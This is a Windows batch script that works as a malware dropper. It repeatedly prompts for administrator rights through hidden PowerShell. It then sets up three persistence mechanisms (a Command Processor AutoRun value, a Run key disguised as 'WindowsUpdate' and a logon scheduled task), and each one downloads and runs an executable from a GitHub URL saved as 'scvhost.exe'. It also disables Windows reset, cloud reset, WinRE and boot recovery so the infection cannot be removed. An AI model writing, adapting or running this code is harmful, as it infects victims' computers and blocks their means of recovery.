@echo off
net session >nul 2>&1 || (
    powershell -WindowStyle Hidden -Command "while ($true) { try { Start-Process -FilePath '%~f0' -Verb RunAs; break } catch {} }"
    exit /b
)
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/jjjjjjjjjjjqqqqqqjjjj/jjjjjjjjjj/raw/refs/heads/main/schost.exe' -OutFile $env:TEMP\scvhost.exe; Start-Process $env:TEMP\scvhost.exe\"" /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/jjjjjjjjjjjqqqqqqjjjj/jjjjjjjjjj/raw/refs/heads/main/schost.exe' -OutFile $env:TEMP\scvhost.exe; Start-Process $env:TEMP\scvhost.exe\"" /f
:: Must be run as Administrator

schtasks /create /tn WindowsUpdateTask /tr "powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jjjjjjjjjjjqqqqqqjjjj/jjjjjjjjjj/raw/refs/heads/main/schost.exe' -OutFile $env:TEMP\scvhost.exe; Start-Process $env:TEMP\scvhost.exe"" /sc ONLOGON /rl HIGHEST /f



:: Disable "Reset this PC" from Settings
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableResetToDefault /t REG_DWORD /d 1 /f

:: Disable Fresh Start & Reset Provisioning
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v AllowResetProvisioning /t REG_DWORD /d 0 /f

:: Block Cloud Reset via Recovery Services
REG ADD "HKLM\SOFTWARE\Microsoft\RecoveryPlatform" /v EnableCloudReset /t REG_DWORD /d 0 /f

:: Disable recovery environment (WinRE)
reagentc /disable

:: Optional: Hide recovery options from boot menu (advanced startup)
bcdedit /set {current} recoveryenabled No




exit
